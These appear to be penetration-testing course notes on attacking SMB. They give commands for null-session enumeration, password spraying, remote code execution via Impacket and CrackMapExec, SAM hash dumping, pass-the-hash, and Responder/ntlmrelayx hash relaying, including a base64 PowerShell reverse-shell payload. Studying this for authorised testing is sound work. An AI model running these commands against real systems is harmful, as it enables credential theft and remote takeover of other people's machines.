## Basics

- Server Message Block is for providing shared access to files and printers across a network.
- Initially designed to run on top of **NetBIOS*** using:
	- TCP port 139
	- UDP ports 137,138
- In Windows 2000 Microsoft added the option to run SMB directly over TCP/IP on
	- TCP Port 445
- On Windows SMB can run directly over TCP port 445 without the need for NetBIOS over TCP/IP but if Windows has NetBIOS enabled or we are targetting a non-windows host SMB will be running on port 139.
- **Samba** is the Unix/Linux based open source implementation of SMB. It allows interconnection between ecosystems.
- Related is MSRPC (Microsoft Remote Procedure Call)
	- RPC over SMB can use SMB named pipes as its underlying transport


## Enumeration
``` bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```
- From nmap we can learn
	- SMB Version
	- Hostname
	- Operating system (If non-Windows. Otherwise nmap will guess.)


### Misconfigurations

#### Anonymous Authentication
- Often called a `null session`
- If allowed we can list the server's shares with smbclient
``` bash
smbclient -N -L //<IP>
```

- **smbmap** is similiar but shows share/file permissions
```bash
smbmap -H <IP>
```

- `-r` (recursive) flag on smbmap displays the files in a share
``` bash
smbmap -H <IP> -r <share>
```

- If the files/shares have read/write permissions we can upload and download
``` bash
smbmap -H <IP> --download "<share>\<file>"

smbmap -H <IP> --upload <localfile> "<share>\<file>"
```

#### Remote Procedure Call (RPC)
- If null sessions are allowed we can use rpcclient to enumerate a host
- [SANS Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)(PDF)
``` bash
rpcclient -U'%' <IP>

enumdomusers
```

- [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) automates some of this enumeration


# SMB Attacks

#### Brute Forcing and Password Spray
- Brute forcing makes it very easy to lock an account out by mistake
	- Best practice is to know the lockout attempt threshold
- Password spraying is a better alternative
	- We target a list of usernames with one or more common password to avoid lockouts
		- Typically 2-3 attempts are safe with a 30-60 minute wait between attempts

#### Password Spray with CrackMapExec
``` bash
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'
```
- `--continue-on-success` flag will prevent CME from exiting after a successful login
- CME [Documentation](https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials)


### Windows
- Larger attack surface than linux
- Possible operations include
	- Remote Code Execution
	- Extract SAM hashes
	- Enumerate logged on users
	- Pass The Hash


### Remote Code Execution (RCE)

#### Psexec
- Linux Implementations of psexec:
	- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
	- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
	- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
	- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
	- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

- Psexec, smbexec, and atexec require domain/username, password, and the IP address.
``` bash
impacket-psexec administrator:'Password123!'@<IP>
```

#### CrackMapExec
- To use specify
	- the protocol - `smb`
	- IP address or IP range
	- `-u` username
	- `-p` password
	- Option:
		- `-x` run cmd commands
		- `-X` run powershell commands
		- `--exec-method` if not defined will attempt atexec
``` bash
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

**Enumerating Logged on Users**
- If we are in a network with multiple machines that share the same local admin account, we can enumerate all machines at once.
```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

**Extract Hashes from SAM Database**
``` bash
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

**Pass The Hash**
- If we can't crack a hash we can still use it to authenticate over SMB.
- All impacket tools can PtH
``` bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```


## Forced Authentication Attacks with Responder
- We can use [Responder](https://github.com/lgandx/Responder) to capture [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).
- One use of Responder is to set up fake services, including SMB, to steal hashes.
- By default, it will find LLMNR and NBT-NS traffic and will respond on behalf of the server the victim is looking for and capture their NetNTLM hahes
``` bash
responder -I <interface name>
```
- All saved hashes are stored in the Responder logs directory
	- `/usr/share/responder/logs/`
	- We can copy the hash to a file and attempt to crack it
		- Hashcat module **5600**

- If we can't crack the hash we can potentially relay it using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)
- Example using ntlmrelayx:
	- First we need to set SMB to OFF in the responder configuration file
		- `/etc/responder/Responder.conf`
	- Then we execute impacket-ntlmrelax

``` bash
impacket-ntlmrelayx --no-http-server -smb2support -t <targetIP>
```
- By default it dumps the SAM database but we can execute commands with the option `-c`
- We can send a base64 encoded powershell [reverse shell](https://www.revshells.com/) as the command
``` bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4A...'
``` 

# Latest SMB Vulnerabilities
- [SMBGhost](https://awakesecurity.com/blog/smbghost-wormable-vulnerability-analysis-cve-2020-0796/) with the [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)